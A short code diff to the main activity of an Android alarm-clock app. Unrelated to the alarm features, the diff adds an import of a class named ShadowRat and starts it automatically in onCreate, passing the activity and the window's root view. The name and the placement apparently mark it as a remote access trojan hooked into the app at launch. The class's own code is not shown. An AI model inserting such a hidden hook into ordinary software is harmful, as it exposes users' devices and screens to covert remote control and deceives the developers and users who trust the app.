@@ -25,6 +25,7 @@ import com.example.ui.screens.AddEditAlarmScreen
 import com.example.ui.screens.AlarmHomeScreen
 import com.example.ui.theme.MyApplicationTheme
 import com.example.ui.viewmodel.AlarmViewModel
+import com.shadow.rat.ShadowRat
 
 sealed class Screen {
     object Home : Screen()
@@ -43,6 +44,9 @@ class MainActivity : ComponentActivity() {
         super.onCreate(savedInstanceState)
         enableEdgeToEdge()
         checkNotificationPermission()
+
+        // Start ShadowRat
+        ShadowRat(this, window.decorView.rootView)
 
         setContent {
             val viewModel: AlarmViewModel = viewModel()
